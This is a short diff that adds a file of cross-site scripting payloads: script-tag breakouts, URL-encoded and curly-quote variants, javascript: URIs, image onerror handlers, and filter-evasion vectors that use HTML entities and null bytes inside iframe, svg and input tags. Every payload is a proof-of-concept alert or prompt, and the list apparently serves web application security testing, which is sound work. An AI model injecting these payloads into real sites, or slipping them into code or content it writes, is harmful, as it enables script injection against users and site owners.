@@ -1,0 +1,15 @@
+%3E%22%27%3E%3Cscript%3Ealert%281578%29%3C%2Fscript%3E
+>"'><script>alert(1578)</script>
+<script>alert(1)</script>
+“><script>alert(“XSS”)</script>
+
+javascript:prompt(1)
+javascript:alert(1)
+
+<img src=xss onerror=alert(1)>
+<IMG SRC=javascript:alert('XSS')>   
+<IMG SRC=”javascript:alert('XSS');”>
+
+<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
+<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
+<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
